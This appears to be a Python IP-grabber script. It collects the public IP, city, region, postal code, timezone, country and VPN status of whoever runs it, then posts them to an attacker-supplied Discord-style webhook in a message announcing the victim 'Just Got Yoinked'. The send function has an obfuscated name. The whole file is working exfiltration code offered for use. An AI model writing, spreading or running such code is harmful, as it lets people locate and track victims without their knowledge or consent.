import httpx;import json
ip          =    httpx.get('https://api.ipify.org').text
city        =    httpx.get(f'https://ipapi.co/{ip}/city').text 
region      =    httpx.get(f'https://ipapi.co/{ip}/region').text
postal      =    httpx.get(f'https://ipapi.co/{ip}/postal').text
timezone    =    httpx.get(f'https://ipapi.co/{ip}/timezone').text
currency    =    httpx.get(f'https://ipapi.co/{ip}/currency').text
country     =    httpx.get(f'https://ipapi.co/{ip}/country_name').text
callcode    =    httpx.get(f"https://ipapi.co/{ip}/country_calling_code").text
vpn         =    httpx.get('http://ip-api.com/json?fields=proxy').text; vpn = json.loads(vpn); vpn = vpn['proxy']

def 一(str):
    data = {
    (
        "content"
    ) : f"""
       **__{ip} Just Got Yoinked__**
           **__Ip Info / 👻__**                                                                               
    > <:rip:959916670946791474> # **Country |  {country}**
    > <:rip:959916670946791474> # **City | {city}**
    > <:rip:959916670946791474> # **Region | {region}**
    > <:rip:959916670946791474> # **Postal Code | {postal}**
    > <:rip:959916670946791474> # **TimeZone |  {timezone}**
    > <:rip:959916670946791474> # **Currency |  {currency}**
    > <:rip:959916670946791474> # **CallCode | {callcode}**
    > <:rip:959916670946791474> # **VPN | {vpn}**  
    """,
    "username" : 
    (
        "GraveYard // 👻"
    ),
    "avatar_url" : 
    (
        "https://i.pinimg.com/236x/2e/a4/9b/2ea49b032782f8146c58ba2abaa7114b.jpg"
    )
    };httpx.post(str, json=data)
